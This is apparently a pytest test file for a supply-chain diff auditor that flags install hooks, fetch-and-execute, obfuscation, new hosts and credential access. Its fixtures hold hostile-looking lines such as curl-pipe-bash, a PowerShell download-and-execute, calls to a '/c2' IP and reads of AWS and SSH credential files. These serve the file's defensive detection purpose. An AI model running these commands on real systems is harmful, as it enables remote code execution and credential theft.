"""Tests for the deterministic red-flag heuristics."""

from __future__ import annotations

import pytest
from auditor_core import redflags
from auditor_core.models import Evidence, Severity


@pytest.mark.parametrize(
    "path,klass",
    [
        (".github/workflows/release.yml", "workflow"),
        ("package-lock.json", "lockfile"),
        ("package.json", "manifest"),
        ("requirements-dev.txt", "manifest"),
        ("src/tests/test_x.py", "test"),
        ("docs/guide.md", "doc"),
        ("README.md", "doc"),
        ("src/index.js", "source"),
    ],
)
def test_classify_file(path, klass):
    assert redflags.classify_file(path) == klass


def test_parse_diff_tracks_paths_added_lines_and_binary():
    diff = (
        "diff --git a/src/a.js b/src/a.js\n"
        "@@ -1 +1,2 @@\n context\n+added line\n-removed\n"
        "diff --git a/blob.bin b/blob.bin\n"
        "Binary files a/blob.bin and b/blob.bin differ\n"
    )
    records = {r["path"]: r for r in redflags.parse_diff(diff)}
    assert records["src/a.js"]["added"] == ["added line"]
    assert records["blob.bin"]["binary"] is True


def _finding_ids(diff: str) -> set[str]:
    return {f.id for f in redflags.diff_findings(diff)}


def test_detect_install_hook_npm():
    diff = (
        "diff --git a/package.json b/package.json\n"
        '@@ @@\n+  "postinstall": "node ./x.js"\n'
    )
    assert "SC-INSTALL-HOOK" in _finding_ids(diff)


def test_detect_install_hook_setup_py():
    diff = "diff --git a/setup.py b/setup.py\n@@ @@\n+    os.system('curl evil')\n"
    assert "SC-INSTALL-HOOK" in _finding_ids(diff)


def test_detect_fetch_exec():
    diff = "diff --git a/run.sh b/run.sh\n@@ @@\n+curl http://x.io/p | bash\n"
    assert "SC-DYNAMIC-FETCH-EXEC" in _finding_ids(diff)


def test_detect_obfuscation_base64_blob():
    blob = "A" * 250
    diff = f"diff --git a/x.js b/x.js\n@@ @@\n+const p = '{blob}'\n"
    assert "SC-OBFUSCATION" in _finding_ids(diff)


def test_detect_net_new_host_ip():
    diff = "diff --git a/x.js b/x.js\n@@ @@\n+fetch('http://45.9.12.34/c2')\n"
    assert "SC-NET-NEW-HOST" in _finding_ids(diff)


def test_detect_cred_access():
    diff = "diff --git a/x.js b/x.js\n@@ @@\n+read('~/.aws/credentials')\n"
    assert "SC-CRED-ACCESS" in _finding_ids(diff)


def test_detect_cred_access_github_token():
    diff = "diff --git a/x.js b/x.js\n@@ @@\n+exfil(process.env.GITHUB_TOKEN)\n"
    assert "SC-CRED-ACCESS" in _finding_ids(diff)


def test_detect_fetch_exec_powershell():
    diff = (
        "diff --git a/setup.ps1 b/setup.ps1\n@@ @@\n"
        "+IEX((New-Object Net.WebClient).DownloadString('http://evil'))\n"
    )
    assert "SC-DYNAMIC-FETCH-EXEC" in _finding_ids(diff)


def test_detect_install_hook_pyproject_build_hook():
    diff = (
        "diff --git a/pyproject.toml b/pyproject.toml\n@@ @@\n"
        '+[tool.hatch.build.hooks.custom]\n+path = "evil.py"\n'
    )
    assert "SC-INSTALL-HOOK" in _finding_ids(diff)


def test_detect_net_new_host_quoted_ip_literal():
    diff = "diff --git a/x.js b/x.js\n@@ @@\n+s.connect(('45.9.12.34', 4444))\n"
    assert "SC-NET-NEW-HOST" in _finding_ids(diff)


@pytest.mark.parametrize(
    "url",
    [
        "http://0x2d090c22/c2",  # hex-encoded IP
        "http://2886795265/c2",  # decimal-encoded IP
        "http://[::1]/c2",  # IPv6 literal
    ],
)
def test_detect_net_new_host_obfuscated_ip(url):
    diff = f"diff --git a/x.js b/x.js\n@@ @@\n+fetch('{url}')\n"
    assert "SC-NET-NEW-HOST" in _finding_ids(diff)


@pytest.mark.parametrize(
    "added",
    [
        "eval(atob('aGk='))",
        "const b = Buffer.from(payload, 'base64')",
        "\\x41" * 12,
    ],
)
def test_detect_obfuscation_variants(added):
    diff = f"diff --git a/x.js b/x.js\n@@ @@\n+{added}\n"
    assert "SC-OBFUSCATION" in _finding_ids(diff)


@pytest.mark.parametrize(
    "added",
    [
        "eval(require('child_process')).exec('x')",
        "exec('curl http://evil/download')",
    ],
)
def test_detect_fetch_exec_variants(added):
    diff = f"diff --git a/run.js b/run.js\n@@ @@\n+{added}\n"
    assert "SC-DYNAMIC-FETCH-EXEC" in _finding_ids(diff)


@pytest.mark.parametrize(
    "added",
    ["open('~/.npmrc')", "post(NODE_AUTH_TOKEN)", "read('~/.ssh/id_ed25519')"],
)
def test_detect_cred_access_variants(added):
    diff = f"diff --git a/x.js b/x.js\n@@ @@\n+{added}\n"
    assert "SC-CRED-ACCESS" in _finding_ids(diff)


def test_doc_files_exempt_from_content_detectors():
    # A doc file carrying scary-looking content produces no findings.
    diff = (
        "diff --git a/docs/guide.md b/docs/guide.md\n@@ @@\n"
        "+curl http://x.io/p | bash\n+eval(atob('x'))\n+fetch('http://45.9.12.34')\n"
        "+read('~/.aws/credentials')\n"
    )
    assert _finding_ids(diff) == set()


def test_detect_ci_workflow_edit():
    diff = (
        "diff --git a/.github/workflows/publish.yml b/.github/workflows/publish.yml\n"
        "@@ @@\n+        run: echo $NPM_TOKEN | base64\n"
    )
    assert "SC-CI-WORKFLOW-EDIT" in _finding_ids(diff)


def test_detect_binary_added():
    diff = "diff --git a/payload.so b/payload.so\nBinary files a/payload.so and b/payload.so differ\n"
    assert "SC-BINARY-ADDED" in _finding_ids(diff)


def test_detectors_ignore_test_and_doc_files():
    diff = (
        "diff --git a/test/evil.test.js b/test/evil.test.js\n"
        "@@ @@\n+fetch('http://45.9.12.34/c2')\n"
        "diff --git a/docs/x.md b/docs/x.md\n"
        "@@ @@\n+curl http://x.io/p | bash\n"
    )
    assert _finding_ids(diff) == set()


def test_clean_diff_produces_no_findings():
    diff = "diff --git a/index.js b/index.js\n@@ @@\n+  return n\n"
    assert redflags.diff_findings(diff) == []


def test_parse_diff_keeps_added_lines_after_dev_null_header():
    # A `+++ /dev/null` line must not drop added lines from the diff --git record.
    diff = (
        "diff --git a/package.json b/package.json\n"
        "+++ /dev/null\n"
        '+  "postinstall": "node ./steal.js"\n'
    )
    assert "SC-INSTALL-HOOK" in _finding_ids(diff)


def test_fetch_exec_flagged_in_test_files():
    # Download-then-exec is suspicious even in a test file (only docs are exempt).
    diff = "diff --git a/test/setup.js b/test/setup.js\n@@ @@\n+curl http://x.io/p | bash\n"
    assert "SC-DYNAMIC-FETCH-EXEC" in _finding_ids(diff)


def test_evidence_findings_unresolved_repo():
    ev = Evidence(source_repo=None, notes_missing=True, resolution_detail="nope")
    ids = {f.id for f in redflags.evidence_findings(ev)}
    assert "SC-SOURCE-PROVENANCE" in ids
    assert "SC-NO-NOTES" in ids


def test_evidence_findings_yanked():
    ev = Evidence(source_repo="o/r", yanked=True)
    ids = {f.id for f in redflags.evidence_findings(ev)}
    assert "SC-YANKED-DELETED" in ids


@pytest.mark.parametrize(
    "severities,floor",
    [
        ([], 0),
        ([Severity.MEDIUM], 30),
        ([Severity.HIGH, Severity.MEDIUM], 60),
        ([Severity.CRITICAL, Severity.LOW], 100),
    ],
)
def test_compute_floor(severities, floor):
    from auditor_core.models import Finding

    findings = [
        Finding(id="X", title="t", severity=s, why_it_matters="w") for s in severities
    ]
    assert redflags.compute_floor(findings) == floor


def test_prescan_combines_and_floors(malicious_evidence):
    findings, floor = redflags.prescan(malicious_evidence)
    ids = {f.id for f in findings}
    assert {"SC-INSTALL-HOOK", "SC-NET-NEW-HOST"} <= ids
    assert floor == 100  # a CRITICAL heuristic pins the floor
